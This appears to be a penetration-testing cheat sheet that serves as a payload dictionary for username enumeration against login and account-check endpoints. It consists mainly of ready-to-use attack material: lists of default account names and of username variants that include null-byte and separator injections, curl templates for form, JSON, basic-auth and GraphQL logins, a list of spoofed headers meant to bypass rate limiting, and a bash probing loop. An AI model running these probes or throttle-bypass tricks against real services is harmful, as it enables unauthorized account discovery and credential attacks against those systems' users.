# Payload dictionary — every username/request token, by purpose

## The control arms — always three

```bash
KNOWN='admin'          # owned, or the seeded default that must exist
FAKE='zzz-nosuch-'$RANDOM   # clearly nonexistent, unique per run
FAKE2='qqq-nosuch-'$RANDOM  # a second bad arm — rules out one-off noise
```

The three arms are the measurement: KNOWN vs FAKE proves the oracle;
FAKE vs FAKE2 proves the delta is the username-class, not a one-off.

## The seeded candidate list — bounded, ranked

```
admin administrator root test demo user guest flag service backup
deploy system support operator monitoring superuser sa ci jenkins
gitlab sonar nexus vault consul prometheus grafana airflow elastic
kibana postgres mysql redis mongo nginx apache www-data
```

## The format variants — per candidate

```
{U}          {U}@corp.com     {U}@localhost   corp\{U}
{U}.corp     a.{U}            {U}_x           {U}-
{U}@x.c      {U}%40corp.com   {U} (trailing)  '{U}'
" {U} "      {U}\x00          {U}#{U}         {U};{U}
```

## The email-slot variants

```
{U}@corp.com   {U}+tag@corp.com   {U}@sub.corp.com   {U}@CORP.COM
 {U}@corp.com   {U}@corp.com.     {U}@corp.com%20    {U}..@corp.com
```

## The request-shape variants — same `{U}`

```bash
# form-encoded
curl -d "user=$U&pass=x" "$BASE/login"
# JSON
curl -H 'Content-Type: application/json' -d "{\"username\":\"$U\",\"password\":\"x\"}" "$BASE/api/login"
# GET
curl "$BASE/check?user=$U"
# basic
curl -u "$U:x" "$BASE/protected"
# GraphQL
curl -d "{\"query\":\"query{userByEmail(email:\\\"$U\\\"){id}}\"}" "$BASE/graphql"
```

## The throttle-bypass headers

```
X-Forwarded-For: <rand>     X-Real-IP: <rand>       X-Client-IP: <rand>
X-Originating-IP: <rand>    X-Remote-IP: <rand>     X-Remote-Addr: <rand>
X-Forwarded: <rand>         Forwarded-For: <rand>   Forwarded: <rand>
CF-Connecting-IP: <rand>    True-Client-IP: <rand>  Fastly-Client-IP: <rand>
X-Cluster-Client-IP: <rand> Via: <rand>             Client-IP: <rand>
```

## The field-name variants

```
user username email login account name uid uname user_name login_id
handle member sub principal identifier phone mobile
```

## The endpoint aliases

```
/login /login/ /api/login /api/v1/login /api/v2/login /auth /api/auth
/signin /session /token /oauth/token /LOGIN
/check-username /check_email /username-available /available /user-exists
/exists /taken /validate-username /check-user /api/username-available
```

## The normalization set — does it matter?

```bash
for u in admin Admin ADMIN ' admin' 'admin ' 'Admin@Corp.Com'; do
  printf '%-14s ' "$u"; curl -s -o /dev/null -w '%{http_code}\n' -X POST -d "user=$u&pass=x" "$BASE/login"
done
```

A `admin`/`Admin`/`ADMIN` that all hit the same oracle confirms
normalization — it does NOT equalize the oracle, just the name.
